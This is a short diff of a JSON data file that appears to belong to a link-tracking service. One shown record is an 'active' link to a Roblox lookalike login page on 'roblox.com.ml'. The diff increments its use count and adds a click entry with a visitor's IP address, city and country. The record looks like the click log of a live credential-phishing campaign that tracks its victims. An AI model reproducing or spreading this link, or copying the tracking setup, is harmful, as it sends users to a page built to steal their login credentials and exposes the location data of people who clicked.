@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 541,
+    "useCount": 542,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4435,6 +4435,14 @@
       },
       {
         "timestamp": 1777094680274,
+        "ip": "195.240.117.231",
+        "country": "Netherlands",
+        "city": "Rotterdam",
+        "flag": "🇳🇱",
+        "countryCode": "NL"
+      },
+      {
+        "timestamp": 1777094688973,
         "ip": "195.240.117.231",
         "country": "Netherlands",
         "city": "Rotterdam",
